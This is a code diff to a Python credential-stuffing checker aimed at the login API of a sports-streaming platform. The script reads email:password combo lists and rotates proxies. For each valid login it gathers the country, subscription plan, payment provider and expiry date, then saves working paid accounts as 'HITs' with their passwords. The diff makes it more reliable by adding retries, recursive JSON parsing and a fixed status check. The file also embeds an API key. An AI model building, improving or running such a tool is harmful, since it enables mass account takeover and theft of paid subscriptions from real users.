@@ -3,6 +3,8 @@ import threading
 import os
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
 # --- CONFIGURATION ---
 COMBO_FILE = "accounts.txt"
@@ -19,6 +21,15 @@ API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
 APP_VAR = "6.58.0.a0c6b52"
 BASE = "https://dce-frontoffice.imggaming.com"
 
+# Retry on transient HTTP errors
+_RETRY = Retry(
+    total=2,
+    backoff_factor=0.5,
+    status_forcelist=[429, 500, 502, 503, 504],
+    allowed_methods=["GET", "POST"],
+    raise_on_status=False,
+)
+
 def get_proxies():
     plist = []
     if not os.path.exists(PROXY_FILE): return [None]
@@ -34,6 +45,13 @@ def get_proxies():
                     plist.append({"http": f"http://{line}", "https": f"http://{line}"})
         return plist if plist else [None]
     except: return [None]
+
+def make_session():
+    session = requests.Session()
+    adapter = HTTPAdapter(max_retries=_RETRY)
+    session.mount("https://", adapter)
+    session.mount("http://", adapter)
+    return session
 
 def make_headers():
     return {
@@ -57,6 +75,36 @@ def make_headers():
         "Accept-Encoding": "gzip, deflate, br",
     }
 
+
+# ── Parsing helpers (match SB parse behaviour) ─────────────────────────
+
+def find_json_value(obj, key):
+    """Recursively find the first scalar value for key in a JSON tree."""
+    if isinstance(obj, dict):
+        if key in obj and isinstance(obj[key], (str, int, float, bool)):
+            return obj[key]
+        for v in obj.values():
+            result = find_json_value(v, key)
+            if result is not None:
+                return result
+    elif isinstance(obj, list):
+        for item in obj:
+            result = find_json_value(item, key)
+            if result is not None:
+                return result
+    return None
+
+
+def lr_parse(text, left, right):
+    """Extract substring between left and right markers."""
+    try:
+        start = text.index(left) + len(left)
+        end = text.index(right, start)
+        return text[start:end]
+    except (ValueError, IndexError):
+        return ""
+
+
 def check(account, proxies):
     global stats
     try:
@@ -64,7 +112,7 @@ def check(account, proxies):
     except ValueError:
         return
 
-    session = requests.Session()
+    session = make_session()
     proxy = proxies[stats["checked"] % len(proxies)] if proxies[0] else None
     headers = make_headers()
 
@@ -76,21 +124,27 @@ def check(account, proxies):
             headers=headers, proxies=proxy, timeout=15
         )
 
-        if "authorisationToken" not in response.text:
-            if "failedAuthentication" in response.text or "NOT_FOUND" in response.text or response.status_code == 401:
+        r1_text = response.text
+        if "authorisationToken" not in r1_text:
+            if "failedAuthentication" in r1_text or "NOT_FOUND" in r1_text or response.status_code == 401:
                 with print_lock: stats["fail"] += 1
             else:
                 with print_lock: stats["error"] += 1
             return
 
-        token = response.json()["authorisationToken"]
+        try:
+            token = response.json()["authorisationToken"]
+        except (ValueError, KeyError):
+            with print_lock: stats["error"] += 1
+            return
         headers["Authorization"] = f"Bearer {token}"
 
-        # 2. ADDRESS → Country
+        # 2. ADDRESS → Country (SB: PARSE JSON "countryCode" recursive)
         country = ""
         try:
             r_addr = session.get(f"{BASE}/api/v2/user/address", headers=headers, proxies=proxy, timeout=10)
-            country = r_addr.json().get("countryCode", "")
+            addr_data = r_addr.json()
+            country = str(find_json_value(addr_data, "countryCode") or "")
         except: pass
 
         # 3. LICENCE-FAMILY → subscription
@@ -110,40 +164,58 @@ def check(account, proxies):
         expiry_date = "N/A"
         days_left = "0"
 
+        # JSON-parsed fields (SB: PARSE "<SOURCE>" JSON "key" — recursive)
+        data = None
         try:
             data = sub_res.json()
-            families = data.get("licenceFamilies", [])
-            if families:
-                fam = families[0]
-                ents = fam.get("entitlements", [])
-                if ents:
-                    ent = ents[0]
-                    plan_name = ent.get("name", "")
-                    plan_type = ent.get("type", "")
-                auto_renewal = fam.get("paymentEventType", "")
-                ppi = fam.get("paymentProviderInfo")
-                if isinstance(ppi, dict):
-                    payment_provider = ppi.get("type", "")
-                account_status = fam.get("status", "")
-                expiry_ms = fam.get("expiryTimestamp", 0)
-                if expiry_ms:
-                    try:
-                        dt = datetime.fromtimestamp(expiry_ms / 1000)
-                        expiry_date = dt.strftime("%Y-%m-%d")
-                        days_left = str((dt - datetime.now()).days)
-                    except: pass
+            plan_name = str(find_json_value(data, "name") or "")
+            plan_type = str(find_json_value(data, "type") or "")
+            auto_renewal = str(find_json_value(data, "paymentEventType") or "")
         except: pass
 
-        # Fallback: LR parse between displayStyle and paymentProviderInfo
+        # LR-parsed: Payment Provider
+        payment_provider = lr_parse(sub_text, '"paymentProviderInfo":{"type":"', '"')
+
+        # LR-parsed: Account Status (two-step, matching SB config)
+        chunk = lr_parse(sub_text, '"displayStyle":', '"paymentProviderInfo"')
+        if chunk:
+            account_status = lr_parse(chunk, '"status":"', '",')
+            if not account_status:
+                account_status = lr_parse(chunk, '"status":"', '"')
+
+        # Fallback: JSON for status
         if not account_status:
             try:
-                chunk = sub_text.split('"displayStyle":')[1]
-                chunk = chunk.split('"paymentProviderInfo"')[0]
-                account_status = chunk.split('"status":"')[1].split('"')[0]
+                if data is None:
+                    data = sub_res.json()
+                val = find_json_value(data, "status")
+                if val and isinstance(val, str):
+                    account_status = val
             except: pass
 
-        # KEYCHECK: ACTIVE → HIT, else → FREE
-        if "ACTIVE" in account_status.upper():
+        # LR-parsed: expiryTimestamp
+        expiry_raw = lr_parse(sub_text, '"expiryTimestamp":', ',"')
+        if not expiry_raw:
+            expiry_raw = lr_parse(sub_text, '"expiryTimestamp":', ',')
+        if not expiry_raw:
+            try:
+                ts = find_json_value(data if data else sub_res.json(), "expiryTimestamp")
+                if ts:
+                    expiry_raw = str(ts)
+            except: pass
+
+        if expiry_raw:
+            try:
+                expiry_ms = int(str(expiry_raw).strip())
+                if expiry_ms > 0:
+                    dt = datetime.fromtimestamp(expiry_ms / 1000)
+                    expiry_date = dt.strftime("%Y-%m-%d")
+                    days_left = str(max(0, (dt - datetime.now()).days))
+            except: pass
+
+        # KEYCHECK: exactly "ACTIVE" → HIT, else → FREE
+        # NOTE: "INACTIVE" contains "ACTIVE" as substring, so use exact match
+        if account_status.upper() == "ACTIVE":
             cap = (
                 f"{email}:{password} | "
                 f"Country = {country} | "
